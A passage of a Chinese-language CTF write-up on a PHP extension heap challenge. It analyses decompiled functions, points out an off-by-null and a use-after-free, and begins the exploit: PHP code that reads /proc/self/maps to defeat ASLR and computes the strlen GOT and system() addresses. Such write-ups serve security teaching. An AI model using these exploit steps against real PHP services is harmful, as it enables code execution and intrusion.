+<h4 id="还有一种方法"><a href="#还有一种方法" class="headerlink" title="还有一种方法"></a>还有一种方法</h4><p>emmm 就下断点在对应函数，执行 c，如果有重复的，就多次 c 即可。</p>
+<hr>
+<h3 id="IDA-分析函数："><a href="#IDA-分析函数：" class="headerlink" title="IDA 分析函数："></a>IDA 分析函数：</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781672857121-0a8fa6ee-4257-4b85-9fa0-9244ace89cbe.png"></p>
+<p>在 phppwn 当中，我们主要看得是 zif_ 类函数：</p>
+<h4 id="zif-addHacker"><a href="#zif-addHacker" class="headerlink" title="zif_addHacker"></a>zif_addHacker</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_addHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 n16_1; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">    __int64 n16; <span class="comment">// rdx</span></span><br><span class="line">    _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> *v7; <span class="comment">// r12</span></span><br><span class="line">    _QWORD *v8; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">void</span> *dest; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// rdx</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *src; <span class="comment">// rsi</span></span><br><span class="line">    _BYTE *v12; <span class="comment">// r13</span></span><br><span class="line">    __int64 v13; <span class="comment">// rax</span></span><br><span class="line">    _BYTE *v14; <span class="comment">// [rsp+8h] [rbp-40h] BYREF</span></span><br><span class="line">    _BYTE *v15; <span class="comment">// [rsp+10h] [rbp-38h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    v3 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">    v16 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14) != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            n16 = <span class="number">0</span>;</span><br><span class="line">            v6 = &amp;unk_4168;</span><br><span class="line">            <span class="keyword">while</span> ( *v6 != <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                ++n16;</span><br><span class="line">                v6 += <span class="number">16</span>;</span><br><span class="line">                <span class="keyword">if</span> ( n16 == <span class="number">16</span> )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">            &#125;</span><br><span class="line">            n16_1 = n16;</span><br><span class="line">            LABEL_9:</span><br><span class="line">            v7 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">16</span> * n16_1;</span><br><span class="line">            v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">            dest = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>));</span><br><span class="line">            *v8 = dest;</span><br><span class="line">            n = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>);           <span class="comment">// len</span></span><br><span class="line">            src = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">24LL</span>);      <span class="comment">// content</span></span><br><span class="line">            v8[<span class="number">1</span>] = n;</span><br><span class="line">            <span class="built_in">memcpy</span>(dest, src, n);</span><br><span class="line">            v12 = v14;</span><br><span class="line">            <span class="built_in">memcpy</span>(v8 + <span class="number">2</span>, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>));</span><br><span class="line">            v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">16LL</span>);</span><br><span class="line">            *(_QWORD *)v7 = v8;</span><br><span class="line">            *((_DWORD *)v7 + <span class="number">2</span>) = <span class="number">13</span>;</span><br><span class="line">            *((_BYTE *)v8 + v13 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v16 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>zend_parse_parameters</code>:传参函数，v15 和 v14 是变量，我们可以利用<code>addHacker($arg1, $arg2);</code>去触发他，相当于接收两个字符串参数。</li>
+<li>先看一下 _zend_string 的结构体，当我们传入一个字符串参数的时候，参数会对应这个样一个结构体</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP 底层的 zend_string 结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;     <span class="comment">// 占用 8 字节 (用于垃圾回收)</span></span><br><span class="line">    zend_ulong        h;      <span class="comment">// 占用 8 字节 (存放字符串的 Hash 值)</span></span><br><span class="line">    <span class="type">size_t</span>            len;    <span class="comment">// 占用 8 字节 (存放字符串的真实长度！) &lt;-- 偏移量正好是 16 (0x10)</span></span><br><span class="line">    <span class="type">char</span>              val[<span class="number">1</span>]; <span class="comment">// 字符串的真实内容 (偏移量是 24)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>那么此时回看这两行代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = (_QWORD *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">dest = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>));</span><br></pre></td></tr></table></figure>
+
+<p>v14 + 16LL 实际上指的是 len，也就是相当于常规堆题目的 malloc(strlen(string) + 16)；</p>
+<p>那么多余的 16 是干嘛的？其实这里是把 v8 当做了一个数组结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    v8[<span class="number">0</span>] = dest指针                    --&gt; <span class="number">8</span> bytes</span><br><span class="line">    v8[<span class="number">1</span>] = n = <span class="built_in">strlen</span>(v15)             --&gt; <span class="number">8</span> bytes</span><br><span class="line">    v8[<span class="number">2</span>] = v14(content)                --&gt; <span class="built_in">strlen</span>(content) bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自己往下看一看伪 C 代码大概就理解了，使用的都是 memcpy 复制过来的。</p>
+<p>v13 是 v14 的长度，这里<code>*((_BYTE *)v8 + v13 + 16) = 0;</code>在 v8 堆的最后多添加了一位 \x00</p>
+<ul>
+<li><strong>很明显的 off-by-null</strong></li>
+</ul>
+<p>总结一下：</p>
+<pre><code>  - 分配一个 Hacker 块，大小是 strlen(name)+0x10
+
+  - 再单独分配一块 content
+
+  - 把 content 拷到 content 缓冲区
+
+  - 把 name 拷到 Hacker+0x10
+</code></pre>
+<h4 id="zif-removeHacker"><a href="#zif-removeHacker" class="headerlink" title="zif_removeHacker"></a>zif_removeHacker</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_removeHacker</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">    <span class="type">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v8; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">    v4 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">    v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v4, &amp;unk_2001, &amp;v8, a4) != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(v8 + <span class="number">8</span>) != <span class="number">4</span> || (v6 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">16</span> * *(_QWORD *)v8, v6[<span class="number">8</span>] == <span class="number">1</span>) || *(_QWORD *)v8 &gt; <span class="number">0xFu</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            v7 = *(_QWORD **)v6;</span><br><span class="line">            _efree(**(_QWORD **)v6);</span><br><span class="line">            _efree(v7);</span><br><span class="line">            *((_DWORD *)&amp;chunkList + <span class="number">4</span> * *(_QWORD *)v8 + <span class="number">2</span>) = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里把创建过的 chunk 都 free 掉</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_efree(**(_QWORD **)v6);</span><br><span class="line">_efree(v7);</span><br></pre></td></tr></table></figure>
+
+<p>虽然把 chunklist 标为空闲，但是指针并没有置 0，存在 UAF 漏洞</p>
+<h4 id="zif-editHacker"><a href="#zif-editHacker" class="headerlink" title="zif_editHacker"></a>zif_editHacker</h4><p>只放出来一些重要的逻辑吧：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v5 = *(<span class="type">void</span> ***)v4;                                        <span class="comment">// 拿到 Hacker 的主体结构块 (之前分析的头部16字节+arg2)</span></span><br><span class="line">dest = **(<span class="type">void</span> ***)v4;                                     <span class="comment">// 拿到偏移 0x00 存放的那个指针 (指向 arg1 的内容块)</span></span><br><span class="line">n = *(_QWORD *)(*(_QWORD *)v10 + <span class="number">16LL</span>);                    <span class="comment">// 传入新字符串长度</span></span><br><span class="line"><span class="keyword">if</span> ( n &lt;= *(_QWORD *)(*(_QWORD *)v4 + <span class="number">8LL</span>) )               <span class="comment">// 比较新旧字符串长度大小</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v10 + <span class="number">24LL</span>), n);<span class="comment">// 如果新字符串比原来的短，直接把新数据拷贝到原来的 dest 指针指向的地方</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)(v11 - __readfsqword(<span class="number">0x28u</span>));</span><br><span class="line">&#125;                                                          <span class="comment">// 如果新字符串更长，原来的地方放不下了</span></span><br><span class="line">_efree(dest);                                              <span class="comment">// 把旧的 arg1 内存释放掉</span></span><br><span class="line">dest_1 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v10 + <span class="number">16LL</span>));<span class="comment">// 申请一块更大的新内存</span></span><br><span class="line">*v5 = dest_1; 												  <span class="comment">// 更新主体结构块里的指针</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">memcpy</span>(dest_1, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v10 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)v10 + <span class="number">16LL</span>));</span><br></pre></td></tr></table></figure>
+
+<p><code>memcpy(dest, (const void *)(*(_QWORD *)v10 + 24LL), n);</code></p>
+<ul>
+<li>取 chunklist-&gt;ptr</li>
+<li>如果 new_content 长度小于等于 hacker-&gt;content_len，直接 memcpy 到 hacker-&gt;content</li>
+<li>否则先 free 原 content，再 malloc 新 content，再拷贝</li>
+</ul>
+<h4 id="zif-displayHacker"><a href="#zif-displayHacker" class="headerlink" title="zif_displayHacker"></a>zif_displayHacker</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">zif_displayHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *s; <span class="comment">// r13</span></span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// r12</span></span><br><span class="line">    _QWORD *v6; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v7; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters() != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)(v7 + <span class="number">8</span>) != <span class="number">4</span> || (v3 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">16</span> * *(_QWORD *)v7, v3[<span class="number">8</span>] == <span class="number">1</span>) || *(_QWORD *)v7 &gt; <span class="number">0xFu</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            s = **(<span class="type">const</span> <span class="type">char</span> ***)v3;</span><br><span class="line">            n = <span class="built_in">strlen</span>(s);</span><br><span class="line">            v6 = (_QWORD *)_emalloc((n + <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8L</span>L);</span><br><span class="line">            *v6 = <span class="number">0x1600000001L</span>L;</span><br><span class="line">            v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            v6[<span class="number">2</span>] = n;</span><br><span class="line">            <span class="built_in">memcpy</span>(v6 + <span class="number">3</span>, s, n);</span><br><span class="line">            *((_BYTE *)v6 + n + <span class="number">24</span>) = <span class="number">0</span>;</span><br><span class="line">            *(_QWORD *)a2 = v6;</span><br><span class="line">            *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">262</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>取 hacker-&gt;content 和 hacker-&gt;name，先对 name 调 strlen，再构造返回字符串。</p>
+<p>值得一提的是传统 Linux Pwn 中包含 <code>printf</code>、<code>puts</code> 或者 <code>write</code> 这样的标准输出函数。</p>
+<p>但是在 PHP 的架构中，底层的 C 函数只负责处理数据，然后把结果返回给上层的 PHP 引擎。真正的打印动作，是由你在 PHP 脚本里写的 <code>echo</code> 或 <code>var_dump</code> 来完成的。</p>
+<p><code>*(_DWORD *)(a2 + 8) = 262;</code> 会告诉 PHP 这个值是什么类型</p>
+<ul>
+<li>引擎拿到返回值后，怎么知道里面装的是整数、布尔值，还是字符串呢？</li>
+<li>在 PHP 底层的 <code>zval</code>（变量容器）结构中，偏移 <code>+8</code> 的位置专门用来存放类型标签。</li>
+<li><code>262</code> (十六进制 0x106) 是 Zend 引擎内部的一个魔法数字，代表 <code>IS_STRING</code>。</li>
+</ul>
+<p>因此一般来说这种就是要返回的值，即我们可以泄露的数据。</p>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hacker</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *content;      <span class="comment">// 偏移 0x0</span></span><br><span class="line">    <span class="type">size_t</span> content_len; <span class="comment">// 偏移 0x8</span></span><br><span class="line">    <span class="type">char</span> name[];        <span class="comment">// 偏移 0x10 开始，跟结构体放在同一个堆块里</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>  全局还有一个 16 项数组 chunkList，每项 0x10 字节，形如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunklist</span> &#123;</span></span><br><span class="line">    Hacker *ptr;   <span class="comment">// 偏移 0x0</span></span><br><span class="line">    <span class="type">int</span> used;      <span class="comment">// 偏移 0x8，1 表示空闲，0xd 表示占用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>removeHacker 之后，chunklist 里还留着悬空指针；而 editHacker&#x2F;displayHacker 只看 slot 是否“占用”，如果这个 chunklist 后来又被别的分配复用了，就能把旧对象当成新对象来改，形成 UAF。</p>
+<h4 id="信息泄露（绕过-ASLR）"><a href="#信息泄露（绕过-ASLR）" class="headerlink" title="信息泄露（绕过 ASLR）"></a>信息泄露（绕过 ASLR）</h4><p>因为系统开启了 ASLR（地址空间布局随机化），每次运行程序时 <code>libc</code> 和 <code>vuln.so</code> 的加载基地址都会变，所以 exp 首先需要找到它们的真实地址。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maps</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;/proc/self/maps&#x27;</span>); <span class="comment">// 读取当前 PHP 进程的内存映射表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 Linux 中，<code>/proc/self/maps</code> 记录了当前进程所有加载的模块和内存布局。</li>
+<li><code>leakaddr()</code> 函数利用正则表达式，从 <code>maps</code> 的输出中匹配并提取出了：<code>libc.so.6</code> 的基地址 (<code>$libc_base</code>)和PHP 漏洞扩展 <code>vuln.so</code> 的基地址 (<code>$vuln_base</code>)</li>
+</ul>
+<p>有了基地址后，再通过固定的相对偏移计算出绝对地址：</p>
+<ul>
+<li><code>$strlen_got = $vuln_base + 0x4020;</code> 目标：<code>vuln.so</code> 中的 <code>strlen</code> 函数的 GOT 表地址。</li>
+<li><code>$system = $libc_base + 0x53110;</code> 目标：<code>libc</code> 中 <code>system</code> 函数的地址。</li>
+</ul>
+<p>这段代码是典型的 CTF Pwn（二进制漏洞利用）题目中，用 PHP 编写的 Exploit（攻击脚本）的核心准备阶段。</p>
+<p>它的核心目的是：绕过操作系统的 ASLR（地址空间布局随机化）保护，计算出内存中关键函数的绝对地址。</p>
+<p>我们可以把这段代码拆成两部分来理解：</p>
+<h4 id="leakaddr-buffer-基地址泄露"><a href="#leakaddr-buffer-基地址泄露" class="headerlink" title="leakaddr($buffer) 基地址泄露"></a>leakaddr($buffer) 基地址泄露</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc\.so\.6/&#x27;</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln\.so/&#x27;</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在现代操作系统中，为了安全，程序每次运行其加载到内存中的地址都是随机的（ASLR）。</p>
+<p>当我们要想调用特定的系统函数（比如 <code>system()</code>），就必须先找到它们在内存中的准确位置。</p>
+<p>这里的 <code>$buffer</code> 传入的通常是 <code>/proc/self/maps</code> 文件的内容。这个文件记录了当前 PHP 进程加载了哪些</p>
+<p>内存模块。</p>
+<p>正则表达式的作用：</p>
+<ul>
+<li>第一个正则在 $buffer 中寻找加载的 libc.so.6（标准C库，里面包含 system 等危险函数）。</li>
+<li>第二个正则在 $buffer 中寻找加载的 vuln.so（题目自定义的有漏洞的 PHP 扩展）。</li>
+</ul>
+<p>它通过正则抓取内存范围开头的十六进制字符串，从而拿到这两个文件的内存基地址（Base Address）。有了基地址，再加上固定的偏移量，就能算出来任何函数的真实内存地址。</p>
+<h4 id="p64-addr-数据的打包"><a href="#p64-addr-数据的打包" class="headerlink" title="p64($addr)  数据的打包"></a>p64($addr)  数据的打包</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$hex</span>) % <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$hex</span> = <span class="string">&quot;0&quot;</span> . <span class="variable">$hex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex</span>)), <span class="number">8</span>, <span class="string">&quot;\0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>把一个我们在 PHP 里计算出来的普通十进制&#x2F;十六进制地址，转换成内存能够识别的 8 字节二进制流。</p>
+<ol>
+<li><p><code>$hex = dechex($addr);</code></p>
+<pre><code>将地址转换为十六进制字符串（例如：`140737351933952` -&gt; `&quot;7ffff7dd4000&quot;`）。
+</code></pre>
+</li>
+<li><p><code>if (strlen($hex) % 2) { $hex = &quot;0&quot; . $hex; }</code></p>
+<pre><code>如果十六进制字符串长度是奇数，在前面补个 `0`（因为 2 个十六进制字符代表 1 个字节）。
+</code></pre>
+</li>
+<li><p><code>hex2bin($hex)</code></p>
+<pre><code> 把十六进制字符串转换成原始的二进制数据。
+</code></pre>
+</li>
+<li><p><code>strrev(...)</code></p>
+<pre><code>反转字节序。将大端序转为机器识别的小端序（例如：`\x7f\xff\xf7` 变成 `\xf7\xff\x7f`）。
+</code></pre>
+</li>
+<li><p><code>str_pad(..., 8, &quot;\0&quot;)</code></p>
+<pre><code> 如果这个地址转换后不满 8 个字节（64位），在后面用空字节 `\x00` 补齐到 8 字节。
+</code></pre>
+</li>
+</ol>
+<h4 id="泄露关键地址"><a href="#泄露关键地址" class="headerlink" title="泄露关键地址"></a>泄露关键地址</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vuln_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>] ?? <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>] ?? <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="variable">$strlen_got</span> = <span class="variable">$vuln_base</span> + <span class="number">0x4020</span>;</span><br><span class="line"><span class="variable">$system</span> = <span class="variable">$libc_base</span> + <span class="number">0x53110</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;libc=%x\n&quot;</span>, <span class="variable">$libc_base</span>);                                                                                                                                                                                          </span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;vuln=%x\n&quot;</span>, <span class="variable">$vuln_base</span>);                                                                                                                                                                                          </span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;strlen_got=%x\n&quot;</span>, <span class="variable">$strlen_got</span>);                                                                                                                                                                                   </span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;system=%x\n&quot;</span>, <span class="variable">$system</span>);     </span><br></pre></td></tr></table></figure>
+
